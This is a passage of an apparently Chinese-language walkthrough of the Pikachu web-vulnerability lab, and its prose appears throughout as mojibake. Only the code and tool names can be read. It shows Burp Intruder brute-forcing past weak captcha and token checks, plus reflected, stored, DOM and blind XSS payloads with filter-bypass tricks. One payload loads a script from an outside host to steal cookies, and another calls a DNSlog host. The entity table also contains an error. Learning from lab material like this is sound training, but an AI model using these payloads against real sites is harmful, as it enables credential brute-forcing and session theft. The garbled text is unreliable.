åœ¨åå°ä¸è¿‡æœŸæˆ–è€…è¿‡æœŸæ—¶é—´è¾ƒé•¿,è¶³å¤Ÿæˆ‘ä»¬å»çˆ†ç ´ç”¨æˆ·åå¯†ç ,é‚£ä¹ˆæ¼æ´å°±äº§ç”Ÿäº†ã€‚\n\nå…¶æ¼æ´æ ¹æœ¬åœ¨äºæœåŠ¡å™¨ç«¯æœªè®¾å®šç”Ÿå‡ºéªŒè¯ç çš„sessionçš„è¿‡æœŸæ—¶é—´,é‚£ä¹ˆæŒ‰ç…§PHPè¯­è¨€é»˜è®¤sessionçš„è¿‡æœŸæ—¶é—´ä¸º24åˆ†é’Ÿ,è¿™ä¸ªéªŒè¯ç 24åˆ†é’Ÿå†…éƒ½æ˜¯æœ‰æ•ˆçš„,é‚£ä¹ˆä¹Ÿè¶³å¤Ÿé»‘å®¢è¿›è¡Œæš´åŠ›ç ´è§£å•¦\n\né‚£æˆ‘ä»¬å°±æ¥åˆ©ç”¨ä¸€ä¸‹è¿™ä¸ªæ¼æ´å§ï¼Œå°†åˆšæ‰çš„åŒ…å‘é€åˆ°intruderæ¨¡å—\n\n1.è®¾ç½®çˆ†ç ´ä½ç½®åŠæ”»å‡»æ–¹å¼\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/amki1dFVAYKntTS.png)\n\n2.è®¾ç½®payloadsï¼Œè¿™é‡Œä¸ºäº†å¿«é€Ÿçˆ†ç ´å‡ºï¼Œæˆ‘æ·»åŠ äº†åŒ…å«æ­£ç¡®ç”¨æˆ·åå¯†ç çš„5ä¸ªç”¨æˆ·ï¼Œæ¯•ç«ŸæŒæ¡æ–¹æ³•æ‰æ˜¯æœ€é‡è¦çš„å•¦\n\n| payload1                                                     | payload2                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2PGq6DNpni9tbS8.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/ZPifDKv4Th65r71.png) |\n\n3.ç‚¹å‡»å¼€å§‹æ”»å‡»ï¼Œæ ¹æ®å“åº”é•¿åº¦å°±å¯ä»¥åˆ¤æ–­å‡ºæ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç äº†\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/PBQmaFJE7g9Dvzn.png)\n\n**ä¿®å¤æ–¹æ³•:**\n\næ–¹æ³•ä¸€ï¼šåœ¨php.inié…ç½®æ–‡ä»¶ä¸­è®¾ç½®è¿‡æœŸæ—¶é—´\næ–¹æ³•äºŒï¼šåœ¨ä»£ç ä¸­è®¾å®šè¯¥éªŒè¯ç éªŒè¯è¿‡ä¸€æ¬¡ä¹‹å,å°±å°†å…¶sessionè¿›è¡Œé”€æ¯(æ›´æœ‰æ•ˆ)\n\n### éªŒè¯ç ç»•è¿‡(on client)\n\n**å®¢æˆ·ç«¯éªŒè¯ç å¸¸è§é—®é¢˜:**\n\n- 1.ä½¿ç”¨å‰ç«¯jså®ç°éªŒè¯ç (çº¸è€è™)\n- 2.å°†éªŒè¯ç åœ¨cookieä¸­æ³„éœ²,å®¹æ˜“è¢«è·å–\n- 3.å°†éªŒè¯ç åœ¨å‰ç«¯æºä»£ç ä¸­æ³„éœ²,å®¹æ˜“è¢«è·å–\n\næ£€æŸ¥éªŒè¯ç å…ƒç´ ï¼Œå‘ç°éªŒè¯æœºåˆ¶æ¥è‡ªå‰ç«¯JS\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/B1sD6CkFEt4qPab.png)\n\næ—¢ç„¶éªŒè¯æ¥è‡ªå‰ç«¯JS,é‚£æˆ‘ä»¬æˆ‘ä»¬å¯ä»¥åœ¨burp suiteä¸è¾“å…¥éªŒè¯ç æˆ–è€…è¾“å…¥é”™çš„éªŒè¯ç å®Œæˆçˆ†ç ´\n\n| è¾“é”™çš„éªŒè¯ç                                                  | ä¸è¾“éªŒè¯ç                                                    |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/fIwRYyGhTumvqox.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/GjPi9OX3pEf265k.png) |\n\nå¯ä»¥å‘ç°ä¸è¾“å…¥éªŒè¯ç æˆ–è€…è¾“å…¥é”™çš„éªŒè¯ç å¯¹è¿”å›ç»“æœå¹¶æ²¡æœ‰å½±å“ï¼Œè¯´æ˜ç¡®å®éªŒè¯æ¥è‡ªå‰ç«¯\n\né‚£æˆ‘ä»¬å°±æ¥åˆ©ç”¨ä¸€ä¸‹è¿™ä¸ªæ¼æ´å§ï¼Œå°†åŒ…å‘é€åˆ°intruderæ¨¡å—,åé¢æ­¥éª¤è·Ÿon serverçš„æ“ä½œæ˜¯ä¸€æ ·çš„\n\n1.è®¾ç½®çˆ†ç ´ä½ç½®åŠæ”»å‡»æ–¹å¼\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/OClQvRkHgIXmNK7.png)\n\n2.è®¾ç½®payloadsï¼Œè¿™é‡Œä¸ºäº†å¿«é€Ÿçˆ†ç ´å‡ºï¼Œæˆ‘æ·»åŠ äº†åŒ…å«æ­£ç¡®ç”¨æˆ·åå¯†ç çš„5ä¸ªç”¨æˆ·ï¼Œæ¯•ç«ŸæŒæ¡æ–¹æ³•æ‰æ˜¯æœ€é‡è¦çš„å•¦\n\n\n| payload1                                                     | payload2                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2PGq6DNpni9tbS8.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/ZPifDKv4Th65r71.png) |\n\n3.ç‚¹å‡»å¼€å§‹æ”»å‡»ï¼Œæ ¹æ®å“åº”é•¿åº¦å°±å¯ä»¥åˆ¤æ–­å‡ºæ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç äº†\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/PBQmaFJE7g9Dvzn.png)\n\n### tokené˜²çˆ†ç ´?\n\n> tokenæ˜¯ç”±æœåŠ¡ç«¯ç”Ÿæˆçš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä½œä¸ºå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯è¯·æ±‚çš„ä¸€ä¸ªæ ‡è¯†ã€‚å¦‚æœå‰ç«¯ä½¿ç”¨ç”¨æˆ·å/å¯†ç å‘æœåŠ¡ç«¯è¯·æ±‚è®¤è¯ï¼ŒæœåŠ¡ç«¯è®¤è¯æˆåŠŸï¼Œé‚£ä¹ˆåœ¨æœåŠ¡ç«¯ä¼šè¿”å› token ç»™å‰ç«¯ã€‚å‰ç«¯å¯ä»¥åœ¨æ¯æ¬¡è¯·æ±‚çš„æ—¶å€™å¸¦ä¸Š token è¯æ˜è‡ªå·±çš„åˆæ³•åœ°ä½ã€‚\n\n**tokenç‰¹æ€§**\n\n- token å®Œå…¨ç”±åº”ç”¨ç®¡ç†ï¼Œæ‰€ä»¥å®ƒå¯ä»¥é¿å¼€åŒæºç­–ç•¥\n\n- tokené˜²æ­¢é‡å¤æäº¤å’ŒCSRF\n\n- token å¯ä»¥æ˜¯æ— çŠ¶æ€çš„ï¼Œå¯ä»¥åœ¨å¤šä¸ªæœåŠ¡é—´å…±äº«\n- tokenæ— æ³•é˜²æ­¢æš´åŠ›ç ´è§£\n\næ£€æŸ¥å…ƒç´ ï¼Œå‘ç°é¡µé¢ä¸ä»…æäº¤usernameå’Œpasswordï¼Œè¿˜æäº¤äº†ä¸€ä¸ªhiddenå±æ€§çš„tokenå€¼\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/MWVjwsz1ALdQCDu.png)\n\næ—¢ç„¶tokenæ˜¯æ— æ³•é˜²æ­¢çˆ†ç ´çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¥çˆ†ç ´è¯•è¯•å§ï¼ŒæŠ“åŒ…å‘é€åˆ°intruderæ¨¡å—ï¼Œå› ä¸ºæœ€å¤šåªèƒ½çˆ†ç ´2ä¸ªå‚æ•°ï¼Œæ‰€ä»¥è¦çŸ¥é“ç”¨æˆ·åæ‰è¡Œã€‚\n\n1.è®¾ç½®çˆ†ç ´ä½ç½®åŠæ”»å‡»æ–¹å¼\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/nPjMAL1toQ5Rubi.png)\n\n2.è®¾ç½®tokenæ­£åˆ™è¡¨è¾¾å¼ã€‚\n\nåœ¨`Options`ä¸­çš„`Grep-Extract`ä¸­æ‰“å‹¾ï¼Œç‚¹å‡»`add`æ·»åŠ è¿‡æ»¤æ¡ä»¶ ç‚¹å‡»`refetch response`æ‰¾åˆ°å“åº”åŒ…ä¸­çš„token ä¹‹é€‰ä¸­ï¼Œå†ç‚¹å‡»`OK`\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/2seXrV4KSmHpZPG.png)\n\nåœ¨`Options`ä¸­å°†çº¿ç¨‹è®¾ç½®ä¸º`1`ï¼Œå¯¹äºæ¯ä¸€ä¸ªåŒ…è¿”å›æ¥çš„tokenå€¼éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€‰æ‹©å•çº¿ç¨‹è¿›è¡Œæ”»å‡»\n\nå°†æœ€ä¸‹æ–¹çš„`Redirections`é€‰æ‹©ä¸º`Always`ï¼Œå¦‚æœä¸ç‚¹ä¸Šè¿™ä¸ªå°±ä¸ä¼šæ‰“å¼€htmlåŒ…çš„bodyéƒ¨åˆ†ï¼Œå› ä¸ºtokenå€¼æ˜¯å­˜å‚¨åœ¨bodyçš„hiddenéƒ¨åˆ†ï¼Œé‚£ä¹ˆä¹Ÿå°±ä¸ä¼šè‡ªåŠ¨è·å–tokenå€¼ï¼Œæˆ‘ä»¬ä¹Ÿå°±ä¸èƒ½ç»•è¿‡å®ƒè¿›è¡Œæš´åŠ›ç ´è§£äº†\n\n| çº¿ç¨‹è®¾ç½®                                                     | é‡å®šå‘è®¾ç½®                                                   |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/er9q8gfSTU7Qix1.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/T7c9YugmfLiStU3.png) |\n\n3.è®¾ç½®payloadsã€‚è¿™é‡Œä¸ºäº†å¿«é€Ÿçˆ†ç ´å‡ºï¼Œå¯†ç payloadæˆ‘è®¾ç½®äº†åŒ…å«æ­£ç¡®å¯†ç çš„5ä¸ªæ¡ç›®\n\n| payload1                                                     | payload2                                                     |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/v2uym4JE7XtFCzL.png) | ![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/9JSiA4MEtCx1TdB.png) |\n\n4.ç‚¹å‡»å¼€å§‹æ”»å‡»ï¼Œæ ¹æ®å“åº”é•¿åº¦å°±å¯ä»¥åˆ¤æ–­å‡ºæ­£ç¡®å¯†ç äº†\n\n![](../images/Pikachu%E6%BC%8F%E6%B4%9E%E5%B9%B3%E5%8F%B0%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/wecp5GFiQRSa9BM.png)\n\n## XSS\n\n> Cross-Site Scripting ç®€ç§°ä¸ºâ€œCSSâ€ï¼Œä¸ºé¿å…ä¸å‰ç«¯å æˆæ ·å¼è¡¨çš„ç¼©å†™\"CSS\"å†²çªï¼Œæ•…åˆç§°XSSã€‚å½¢æˆXSSæ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç¨‹åºå¯¹è¾“å…¥å’Œè¾“å‡ºæ²¡æœ‰åšåˆé€‚çš„å¤„ç†ï¼Œå¯¼è‡´â€œç²¾å¿ƒæ„é€ â€çš„å­—ç¬¦è¾“å‡ºåœ¨å‰ç«¯æ—¶è¢«æµè§ˆå™¨å½“ä½œæœ‰æ•ˆä»£ç è§£ææ‰§è¡Œä»è€Œäº§ç”Ÿå±å®³ã€‚\n\n### åå°„å‹xss(get)\n\n**Payload:**\n\n```javascript\n<script>alert(\"jwt\")</script>\n```\n\nç”±äºå‰ç«¯å¯¹è¾“å…¥é•¿åº¦åšäº†é™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹ä¸€ä¸‹æœ€å¤§é•¿åº¦æ‰èƒ½è¾“å…¥å®Œæ•´çš„payloadï¼Œè¿™æ˜¯ä¸€ä¸ªç®€å•çš„åå°„å‹XSSï¼Œä»å‰ç«¯è¾“å…¥ç”±åç«¯æ¥å—å†è¾“å‡º\n\n**æºç åˆ†æ:**\n\n```php\n//å…³é”®ä»£ç \n$html.=\"<p class='notice'>who is {$_GET['message']},i don't care!</p>\";\n\n<?php echo $html;?>\n```\n\n`$html`å˜é‡ç›´æ¥æ‹¼æ¥äº†`{$_GET[â€˜messageâ€™]}`,åˆç›´æ¥`echo`ï¼Œæ²¡åšä»»ä½•è¿‡æ»¤ï¼Œè½¬ä¹‰ã€‚\n\n**åˆ©ç”¨Pikachu-XSSåå°è·å–cookie**\n\n1.è®¿é—®ç®¡ç†å·¥å…·é‡Œçš„XSSåå°ï¼Œåˆå§‹åŒ–æ•°æ®åº“\n\n2.ç™»å½•XSSåå°ï¼Œè´¦æˆ·admin/123456\n\n3.åœ¨åå°„å‹xssçª—å£ä¸­æ’å…¥å¦‚ä¸‹jsåï¼Œåœ¨XSSåå°å°±èƒ½æˆåŠŸæ¥æ”¶åˆ°Cookie\n\n```js\n<script src=http://xss.fbisb.com/ij7V></script>\n```\n\nç”±äºæ˜¯GETç±»å‹çš„XSSæ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ„é€ ä¸€ä¸ªå¸¦æœ‰Payloadçš„URLï¼Œè¯±ä½¿å—å®³è€…ç‚¹å‡»å°±èƒ½å–å¾—Cookie\n\n### åå°„å‹xss(post)\n\nå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªç”¨æˆ·ç™»é™†çª—å£ï¼Œæ ¹æ®æç¤ºï¼Œè´¦æˆ·admin/123456\n\nç™»ä¸Šå»ä»¥åå‘ç°è¿˜æ˜¯æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥æ„é€ **Payload:**\n\n```javascript\n<script>alert(document.cookie)</script>;\n```\n\n### å­˜å‚¨å‹xss\n\n> å­˜å‚¨å‹XSSå’Œåå°„å‹XSSå½¢æˆçš„åŸå› æ˜¯ä¸€æ ·çš„ï¼Œä¸åŒçš„æ˜¯å­˜å‚¨å‹XSSä¸‹æ”»å‡»è€…çš„å¯ä»¥å°†è„šæœ¬æ³¨å…¥åˆ°åå°å­˜å‚¨èµ·æ¥ï¼Œæ„æˆæ›´åŠ æŒä¹…çš„å±å®³\n\n**Payload:**\n\n```javascript\n<script>alert(document.cookie)</script>\n```\n\næ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæ’å…¥payloadåï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢éƒ½ä¼šalertå‡ºcookieï¼Œè¯´æ˜æ˜¯å­˜å‚¨å‹çš„ï¼Œå·²ç»å­˜åœ¨æ•°æ®åº“äº†ã€‚\n\n**æºç åˆ†æ:**\n\n```php\n//å…³é”®ä»£ç \n$message=escape($link, $_POST['message']);\n$query=\"insert into message(content,time) values('$message',now())\";\n\necho \"<p class='con'>{$data['content']}</p><a href='xss_stored.php?id={$data['id']}'>åˆ é™¤</a>\";\n```\n\nå¯¹è¾“å…¥çš„å†…å®¹æ²¡æœ‰åšä»»ä½•è¿‡æ»¤å’Œè½¬ä¹‰ï¼Œç›´æ¥å¾€æ•°æ®åº“é‡Œæ’å…¥äº†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ï¼Œè¾“å‡ºçš„æ—¶å€™ä¹Ÿæ²¡æœ‰ä»»ä½•è¿‡æ»¤å’Œè½¬ä¹‰ï¼Œç›´æ¥å–æ•°æ®echoå‡ºæ¥ã€‚\n\n### DOMå‹xss\n\n> é€ æˆDOMå‹XSSçš„åŸå› æ˜¯å‰ç«¯çš„è¾“å…¥è¢«DOMç»™è·å–åˆ°äº†ï¼Œé€šè¿‡DOMåˆåœ¨å‰ç«¯è¾“å‡ºï¼Œè·Ÿåå°„å‹å’Œå­˜å‚¨å‹æ¯”èµ·æ¥ï¼Œå®ƒæ˜¯ä¸ç»è¿‡åå°äº¤äº’çš„\n\n**HTML DOM æ ‘**\n\n![](https://www.w3school.com.cn/i/ct_htmltree.gif)\n\néšä¾¿è¾“å…¥å­—ç¬¦ä¸²åç‚¹å‡»æŒ‰é’®ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢æ˜¾ç¤ºä¸€æ¡è¶…é“¾æ¥ï¼Œå®¡æŸ¥æºç \n\n```html\n<script>\nfunction domxss(){\n    var str = document.getElementById(\"text\").value;\n    document.getElementById(\"dom\").innerHTML = \"<a href='\"+str+\"'>what do you see?</a>\";\n}\n</script>\n\n<div id=\"dom\">\n  <a href=\"jwt\">what do you see?</a>\n</div>\n```\n\nå‘ç°æˆ‘ä»¬è¾“å…¥çš„strè¢«è°ƒæ•´åœ¨idä¸ºdomçš„å…ƒç´ é‡Œï¼Œè¿˜æœ‰æ®µJSä»£ç ï¼Œå®ƒé€šè¿‡ getElementById è·å–åˆ°äº†æ ‡ç­¾ id ä¸º text çš„å†…å®¹èµ‹å€¼ç»™strï¼Œç„¶ååˆæŠŠ str çš„å†…å®¹é€šè¿‡å­—ç¬¦ä¸²æ‹¼æ¥çš„æ–¹å¼å†™åˆ°äº† a æ ‡ç­¾çš„ href å±æ€§ä¸­ï¼Œaæ ‡ç­¾ä¼šå†™åˆ° id ä¸º domçš„ div æ ‡ç­¾ä¸­ã€‚\n\n**é€šè¿‡é—­åˆaæ ‡ç­¾çš„æ–¹å¼æ„é€ Payloadï¼š**\n\n```html\n//payload1:\n#' onclick=alert(\"jwt\")>\n\né—­åˆåï¼š<a href='#' onclick=\"alert(\"jwt\")\">'>what do you see?</a>\n\n//payload2:\n'><img src=\"#\" onmouseover=\"alert('jwt')\">\n\né—­åˆåï¼š<a href><img src=\"#\" onmouseover=\"alert('jwt')\">'>what do you see?</a>\n\n    \n//payload3:    \n' onclick=\"alert('jwt')\">\n\né—­åˆåï¼š<a href onclick=\"alert('jwt')\"> >'what do you see?</a>    \n```\n\n### DOMå‹xss-x\n\nåŒæ ·éšä¾¿è¾“å…¥å­—ç¬¦ä¸²åç‚¹å‡»æŒ‰é’®ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢æ˜¾ç¤ºä¸€æ¡è¶…é“¾æ¥ï¼Œå®¡æŸ¥æºç \n\n```html\n<script>\nfunction domxss(){\n    var str = window.location.search;\n    var txss = decodeURIComponent(str.split(\"text=\")[1]);\n    var xss = txss.replace(/\\+/g,' ');\n    document.getElementById(\"dom\").innerHTML = \"<a href='\"+xss+\"'>å°±è®©å¾€äº‹éƒ½éšé£,éƒ½éšé£å§</a>\";\n}\n</script>\n\n<div id=\"dom\">\n    <a href=\"jwt\">å°±è®©å¾€äº‹éƒ½éšé£,éƒ½éšé£å§</a>\n</div>\n```\n\nè¿™é‡Œä¹Ÿæœ‰æ®µJSä»£ç ï¼Œå®ƒåˆ©ç”¨ `window.location.search` è·å–æµè§ˆå™¨ä¸­URLçš„å†…å®¹ï¼Œç„¶åèµ‹å€¼ç»™ str ï¼Œå†ç»è¿‡URLè§£ç å’Œå­—ç¬¦ä¸²åˆ†éš”ï¼Œå–å‡ºURLä¸­çš„å‚æ•°å†…å®¹ï¼Œå†æŠŠ â€œ+â€ æ›¿æ¢ä¸º â€œ â€ï¼ˆç©ºæ ¼ï¼‰ï¼Œèµ‹å€¼ç»™ xssï¼Œæœ€åæŠŠ xss æ‹¼æ¥åˆ° a æ ‡ç­¾ä¸­ï¼Œç„¶åå†™åˆ° id ä¸º dom çš„ div æ ‡ç­¾ä¸­ï¼Œè·Ÿå‰é¢çš„DOMä¸åŒçš„æ˜¯ï¼Œå®ƒçš„è¾“å…¥æ˜¯ä»æµè§ˆå™¨çš„URLä¸­è·å–çš„ï¼Œå¾ˆåƒåå°„å‹XSS(get)\n\nç”¨æˆ·çš„è¾“å…¥åŒæ ·è¢«æ‹¼æ¥åˆ°aæ ‡ç­¾ä¸­ï¼Œæ„é€ çš„`Payload`è·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„\n\n```html\n//payload1:\n#' onclick=alert(\"jwt\")>\n\n//payload2:\n'><img src=\"#\" onmouseover=\"alert('jwt')\">\n    \n//payload3:    \n' onclick=\"alert('jwt')\">\n```\n\n### xssä¹‹ç›²æ‰“\n\n> è¾“å…¥çš„å†…å®¹**ä¸ä¼šåœ¨å‰ç«¯è¾“å‡º**ï¼Œè€Œæ˜¯æäº¤åˆ°äº†åå°ï¼Œç®¡ç†å‘˜æ‰å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥ä¸€æ®µæ¶æ„JSä»£ç ï¼Œç®¡ç†å‘˜ç™»å½•åˆ°åå°ç®¡ç†ç•Œé¢ï¼Œæ¶æ„JSä»£ç å°±ä¼šè¢«æ‰§è¡Œï¼Œåå°ç®¡ç†å‘˜å°±ä¼šé­å—åˆ°XSSæ”»å‡»\n\nåœ¨é¡µé¢è¾“å…¥ä»¥ä¸‹å†…å®¹\n\n![](https://img.jwt1399.top//img/20200728184942.png)\n\næŸ¥çœ‹æç¤ºï¼Œå¾—åˆ°åå°åœ°å€(/xssblind/admin_login.php)å’Œè´¦æˆ·(admin/123456)ï¼Œç™»å½•åå°ç®¡ç†ç•Œé¢,æˆåŠŸå¼¹çª—\n\n![](https://img.jwt1399.top//img/20200728185253.png)\n\n**DNSlogç›²æ‰“Payloadï¼š**\n\n```html\n<img src=\"http://xss.xxxxx.ceye.io/abc>                  \n```\n\nå¦‚æœç›²æ‰“æˆåŠŸï¼Œä¼šåœ¨å¹³å°ä¸Šæ”¶åˆ°å¦‚ä¸‹çš„é“¾æ¥è®¿é—®è®°å½•ï¼š\n\n![](https://img.jwt1399.top//img/20200807145213.png)\n\n### xssä¹‹è¿‡æ»¤\n\n**å¸¸è§è¿‡æ»¤ç»•è¿‡æ–¹æ³•ï¼š**\n\n- å‰ç«¯é™åˆ¶ç»•è¿‡ï¼Œç›´æ¥æŠ“åŒ…é‡æ”¾ï¼Œæˆ–è€…ä¿®æ”¹htmlå‰ç«¯ä»£ç ã€‚æ¯”å¦‚åå°„å‹XSS(get)ä¸­é™åˆ¶è¾“å…¥20ä¸ªå­—ç¬¦ã€‚\n- å¤§å°å†™ï¼Œä¾‹å¦‚`<SCRIPT>aLeRT(â€œjwtâ€)</sCRIpt>`ã€‚åå°å¯èƒ½ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼Œå¦‚æœæ­£åˆ™é‡Œé¢åªåŒ¹é…å°å†™ï¼Œé‚£å°±å¯èƒ½è¢«ç»•è¿‡ã€‚\n- åŒå†™ï¼Œä¾‹å¦‚`<scri<script>pt>alert(â€œjwtâ€)</scri</script>pt>`ã€‚åå°å¯èƒ½æŠŠ`<script>`æ ‡ç­¾å»æ‰ï¼Œä½†å¯èƒ½åªå»æ‰ä¸€æ¬¡ã€‚\n- æ³¨é‡Šå¹²æ‰°ï¼Œä¾‹å¦‚`<scri<!--test-->pt>alert(â€œjwtâ€)</sc<!--test-->ript>`ã€‚åŠ ä¸Šæ³¨é‡Šåå¯èƒ½å¯ä»¥ç»•è¿‡åå°è¿‡æ»¤æœºåˆ¶ã€‚\n- ç¼–ç ï¼Œåå°è¿‡æ»¤äº†ç‰¹æ®Šå­—ç¬¦ï¼Œæ¯”å¦‚`<script>`æ ‡ç­¾ï¼Œä½†è¯¥æ ‡ç­¾å¯ä»¥è¢«å„ç§ç¼–ç ï¼Œåå°ä¸ä¸€å®šè¿‡æ»¤\n\n\n\nåœ¨é¡µé¢ä¸Šè¾“å…¥ï¼Œè¿›è¡Œæµ‹è¯•ï¼Œçœ‹çœ‹è¿‡æ»¤äº†ä»€ä¹ˆ\n\n| è¾“å…¥`<script>alert(\"jwt\")</script>`                  | è¾“å…¥`alert(\"jwt\")`                                   |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top//img/20200728191609.png) | ![](https://img.jwt1399.top//img/20200728192142.png) |\n\nå¯ä»¥æ¨æµ‹å‡ºè¿‡æ»¤äº†`<srcipt`åŠå…¶ä¹‹é—´çš„å­—ç¬¦ï¼Œå°è¯•å¤§å°å†™æ··åˆæˆ–ä½¿ç”¨imgæ ‡ç­¾ï¼ŒæˆåŠŸç»•è¿‡\n\n```javascript\n<SCRIPT>alert(\"jwt\")</sCRIpt>\n\n<img src=x onerror=alert(\"jwt\")>\n```\n\n**æºç åˆ†æï¼š**\n\n```php\n$html = '';\nif(isset($_GET['submit']) && $_GET['message'] != null){\n    //è¿™é‡Œä¼šä½¿ç”¨æ­£åˆ™å¯¹<scriptè¿›è¡Œæ›¿æ¢ä¸ºç©º,ä¹Ÿå°±æ˜¯è¿‡æ»¤æ‰\n    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);\n//    $message=str_ireplace('<script>',$_GET['message']);\n\n    if($message == 'yes'){\n        $html.=\"<p>é‚£å°±å»äººæ°‘å¹¿åœºä¸€ä¸ªäººåä¸€ä¼šå„¿å§!</p>\";\n    }else{\n        $html.=\"<p>åˆ«è¯´è¿™äº›'{$message}'çš„è¯,ä¸è¦æ€•,å°±æ˜¯å¹²!</p>\";\n    }\n}\n```\n\nåå°å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œäº†æ­£åˆ™åŒ¹é…è¿‡æ»¤ï¼Œå°†`<srcipt`å’Œå…¶ä¹‹é—´çš„å­—ç¬¦éƒ½è¿‡æ»¤æ‰äº†ã€‚ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤imgæ ‡ç­¾ï¼Œæ²¡æœ‰è¿‡æ»¤å±é™©å‡½æ•°ã€‚\n\n### xssä¹‹htmlspecialchars\n\n> htmlspecialchars()æ˜¯PHPé‡Œé¢**æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“çš„å‡½æ•°**ï¼Œè¿™ä¸ªå‡½æ•°é»˜è®¤æƒ…å†µä¸‹æ˜¯ä¸ä¼šç¼–ç å•å¼•å·çš„\n\n**è¯­æ³•ï¼š**\n\n```php\n$value = htmlspecialchars($_GET['value'], ENT_COMPAT); \n# ç¬¬2ä¸ªå‚æ•°è§„å®šäº†å¦‚ä½•å¤„ç†å¼•å·\nENT_COMPAT   # é»˜è®¤,ä»…å¯¹åŒå¼•å·è¿›è¡Œç¼–ç \nENT_QUOTES   # æ¨è,ç¼–ç å•åŒå¼•å·\nENT_NOQUOTES # ä¸ç¼–ç ä»»ä½•å¼•å·\n```\n\né¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š\n\n- & ï¼ˆå’Œå·ï¼‰æˆä¸º  &amp\n- \" ï¼ˆåŒå¼•å·ï¼‰æˆä¸º  &quot\n- ' ï¼ˆå•å¼•å·ï¼‰æˆä¸º &#039\n- < ï¼ˆå°äºï¼‰æˆä¸º  &lt\n- \\> ï¼ˆå¤§äºï¼‰æˆä¸º  &lt\n\nå®¡æŸ¥å…ƒç´ åå‘ç°è¾“å…¥çš„å†…å®¹æ˜¯è¢«æ‹¼æ¥åœ¨`<a href =\"è¾“å…¥çš„å†…å®¹\">`ä¸­\n\nè¾“å…¥`'\"<>?#'1399`,å¯ä»¥çœ‹åˆ° `\"`ã€`>` ã€ `<` éƒ½ç»è¿‡äº†ç¼–ç 